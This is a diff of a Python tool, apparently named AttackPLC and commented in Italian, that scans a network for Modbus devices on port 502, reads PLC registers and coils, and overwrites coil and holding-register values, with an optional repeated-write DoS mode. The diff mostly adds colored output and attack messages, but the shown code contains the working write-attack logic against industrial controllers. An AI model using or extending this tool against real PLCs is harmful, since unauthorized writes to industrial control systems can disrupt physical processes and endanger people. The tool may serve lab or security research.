@@ -71,11 +71,14 @@ class AttackPLC:
     questo script
     """
     def find_plcs(self):
+        os.system('clear')
+        print(f'{self.bcolors.BGBLUE}== Find active PLCs =={self.bcolors.ENDC}\n')
+
         # Chiedo all'utente quale rete vuole scansionare
         net = input("Network to scan (CIDR format): ")
 
         # Eseguo lo scan sulla rete specificata
-        print(f"Scanning {net}\n")
+        print(f"Scanning {self.bcolors.OKBLUE}{net}{self.bcolors.ENDC}\n")
         nmap = nmap3.NmapScanTechniques()
         results = nmap.nmap_tcp_scan(net, args='-p 502')
 
@@ -83,7 +86,7 @@ class AttackPLC:
         with open('network_scan.json', 'w') as f:
             f.write(json.dumps(results, indent=4, sort_keys=True))
 
-        print("Active PLCs found: ")
+        print(f"{self.bcolors.OKRED}Active PLCs found: {self.bcolors.ENDC}")
 
         # Questo serve esclusivamente come chiave
         # per il dict che andrò a creare. Posso farlo
@@ -118,7 +121,7 @@ class AttackPLC:
             p.write(json.dumps(self.plc_list, indent=4))
 
         time.sleep(1)  # Questa non servirebbe, è solo per rallentare un po' il flusso di esecuzione...
-        input("Done. Presse Enter to continue: ")
+        input("Done. Press Enter to continue: ")
 
     """
     Chiedo all'utente i registri da scansionare
@@ -137,7 +140,7 @@ class AttackPLC:
         return req_di_registers, req_input_registers, req_holding_registers, req_coils
 
     """
-    Leggo i Discrete Input Registers (identificati da %IXa.b).
+    Leggo i Discrete Input Registers (identificati da %IX).
 
     Parametri:
     - mb: è il file descriptor della connessione Modbus
@@ -183,7 +186,7 @@ class AttackPLC:
         return registri
 
     """
-    Leggo gli Input Registers (identificati da %IWa)
+    Leggo gli Input Registers (identificati da %IW)
 
     Parametri:
     Vedi metodo read_DiscreteInput()
@@ -209,7 +212,7 @@ class AttackPLC:
         return registri
 
     """
-    Leggo gli Output e gli Holding Registers
+    Leggo gli Output e gli Holding Registers (%QW)
     
     Parametri: vedi metodo read_DiscreteInput()
     """
@@ -234,7 +237,7 @@ class AttackPLC:
         return registri
 
     """
-    Leggo le Coils
+    Leggo le Coils (%QX)
     
     Parametri: vedi metodo read_DiscreteInput()
     """
@@ -302,6 +305,8 @@ class AttackPLC:
     una singola PLC su scelta dell'utente, sempre tra quelle disponibili in elenco
     """
     def scan_plcs(self, single_plc='all'):
+        os.system('clear')
+
         # Se non è presente lo scan delle PLC attive sulla rete, chiedi all'utente di eseguirne uno
         self.scan_is_present()
 
@@ -314,7 +319,7 @@ class AttackPLC:
 
         # Faccio lo scan di tutte le PLC della rete
         if not single_plc == 'single':
-            print("Scanning all PLCs\n")
+            print(f"{self.bcolors.BGBLUE}== Scan all PLCs registers == {self.bcolors.ENDC}\n")
 
             # Chiedo all'utente i registri da scansionare
             req_di_registers, req_input_registers, req_holding_registers, req_coils = self.ask_registers()
@@ -338,8 +343,8 @@ class AttackPLC:
         else:
             plc = None
 
-            print("Scanning single PLC\n")
-            print("Available PLCs: ")
+            print(f"{self.bcolors.BGBLUE}== Scan single PLC registers =={self.bcolors.ENDC}\n")
+            print(f"{self.bcolors.OKRED}Available PLCs: {self.bcolors.ENDC}")
             count = 1  # Contatore, serve solo per l'elenco delle plc
 
             # Mostro l'elenco delle PLC disponibili sulla rete
@@ -348,7 +353,7 @@ class AttackPLC:
                 count += 1
 
             print("\n")
-            choice = input('Choose a PLC: ')
+            choice = input(f'Choose a PLC [1-{len(plc_list)}]: ')
 
             # Ovviamente la PLC deve essere in elenco...
             for key in plc_list:
@@ -537,9 +542,19 @@ class AttackPLC:
                     print(f"Connection to {plc} failed. Exiting")
                     return
 
+                # Serve solo per la print
+                octal_addr = int(modbus_addr) / 8
+                octal_coil = int(modbus_addr) % 8
+
+                print("\n")
                 if not multi == 'multi':
+                    print(f'Attacking {self.bcolors.BOLD}single{self.bcolors.ENDC} coil '
+                          f'{self.bcolors.OKRED}%QX{int(octal_addr)}.{int(octal_coil)}{self.bcolors.ENDC}')
                     mb.write_single_coil(modbus_addr, bool(value))
                 else:
+                    print(f'Attacking {self.bcolors.BOLD}multiple{self.bcolors.ENDC} coils '
+                          f'from {self.bcolors.OKRED}%QX{int(octal_addr)}.{int(octal_coil)}{self.bcolors.ENDC} '
+                          f'to {self.bcolors.OKRED}%QX{int(octal_addr)}.{int(octal_coil) + (len(value) -1)}{self.bcolors.ENDC}')
                     mb.write_multiple_coils(modbus_addr, value)
 
                 mb.close()
@@ -561,9 +576,15 @@ class AttackPLC:
                     print(f"Connection to {plc} failed. Exiting")
                     return
 
+                print("\n")
                 if not multi == 'multi':
+                    print(f'Attacking {self.bcolors.BOLD}single{self.bcolors.ENDC} register '
+                          f'{self.bcolors.OKBLUE}%QW{modbus_addr}{self.bcolors.ENDC}')
                     mb.write_single_register(int(modbus_addr), int(value))
                 else:
+                    print(f'Attacking {self.bcolors.BOLD}multiple{self.bcolors.ENDC} registers '
+                          f'from {self.bcolors.OKBLUE}%QW{modbus_addr}{self.bcolors.ENDC} '
+                          f'to {self.bcolors.OKBLUE}%QW{int(modbus_addr) + len(value)}{self.bcolors.ENDC}')
                     mb.write_multiple_registers(int(modbus_addr), value)
 
                 mb.close()
@@ -575,6 +596,8 @@ class AttackPLC:
     - single_plc: se 'all', attacca tutte le PLC in lista; se 'single', attacca la singola PLC scelta dall'utente
     """
     def change_register_value(self, single_plc='all'):
+        os.system('clear')
+
         if not single_plc == 'single':
             # Al solito, verifico che prima sia stata scansionata la rete. Se non è stato fatto, chiedi
             # all'utente di rifare lo scan.
@@ -592,7 +615,8 @@ class AttackPLC:
             tmp_plc = list(plc_list.keys())[0]
             tmp_plc_data = plc_list[tmp_plc]
 
-            print("Available registers: \n")
+            print(f'{self.bcolors.BGBLUE}== Attack PLCs =={self.bcolors.ENDC}\n')
+            print(f"{self.bcolors.OKCYAN}Available registers: {self.bcolors.ENDC}\n")
 
             # Scorri i vari registri e mostra quelli disponibili
             for key, val in tmp_plc_data.items():
@@ -620,13 +644,13 @@ class AttackPLC:
             else:
                 reg_type, modbus_addr, value = self.select_register('single')
 
-            loop = input("Do you want to perform a DoS on the register? [y/n] ")
+            loop = input(f"Do you want to perform a {self.bcolors.BOLD}DoS attack{self.bcolors.ENDC} on the register? [y/n] ")
 
             print("\n")
 
             # Mi connetto a tutte le PLC della lista
             for plc in plc_list:
-                print(f"Connecting to {plc}")
+                print(f"Connecting to {self.bcolors.OKGREEN}{plc}{self.bcolors.ENDC}")
 
                 # Porta l'attacco vero e proprio
                 if not multi == 'y' or multi == 'Y':
@@ -644,13 +668,14 @@ class AttackPLC:
             plc_list = json.loads(plc_list)
 
             # Mostra banalmente l'elenco delle PLC disponibili
-            print("Available PLCs: ")
+            print(f'{self.bcolors.BGBLUE}== Attack single PLC =={self.bcolors.ENDC}\n')
+            print(f"{self.bcolors.OKRED}Available PLCs: {self.bcolors.ENDC}")
             counter = 1
             for i in plc_list:
                 print(f'{counter} - {plc_list[i]}')
 
             print("\n")
-            choice = input("Select PLC: ")
+            choice = input(f"Select PLC [1-{len(plc_list)}]: ")
 
             # Controllo se esiste il file con la scansione della PLC selezionata
             if not os.path.exists(f'{plc_list[str(choice)]}.json'):
@@ -675,7 +700,8 @@ class AttackPLC:
 
             # Similmente al caso dell'attacco su tutte le PLC, ma questa volta mostra anche il valore
             # dei registri
-            print(f"Available registers and values for {plc}: \n")
+            print(f"{self.bcolors.OKCYAN}Available registers and values for "
+                  f"{self.bcolors.BOLD}{plc}{self.bcolors.ENDC}:{self.bcolors.ENDC} \n")
 
             for key, val in tmp_plc_data.items():
                 if key == "HoldingOutputRegisters":
@@ -701,7 +727,7 @@ class AttackPLC:
             else:
                 reg_type, modbus_addr, value = self.select_register('single')
 
-            loop = input("Do you want to perform a DoS on the register? [y/n]: ")
+            loop = input(f"Do you want to perform a {self.bcolors.BOLD}DoS attack{self.bcolors.ENDC} on the register? [y/n]: ")
 
             if not multi == 'y' or multi == 'Y':
                 self.make_attack(plc, reg_type, 'single', modbus_addr, value, loop)
@@ -726,7 +752,7 @@ def main():
         # Pulisco lo schermo, che fa più elegante...
         os.system('clear')
 
-        print(f"{ap.bcolors.BGRED}{ap.bcolors.OKBLACK}==== Attack PLC - Menu ===={ap.bcolors.ENDC}{ap.bcolors.ENDC}")
+        print(f"{ap.bcolors.BGRED}{ap.bcolors.OKBLACK}==== Attack PLC - Menu ===={ap.bcolors.ENDC}{ap.bcolors.ENDC}\n")
         print("1 - Find active PLCs")
         print("2 - Scan all PLCs registers")
         print("3 - Scan single PLC registers")
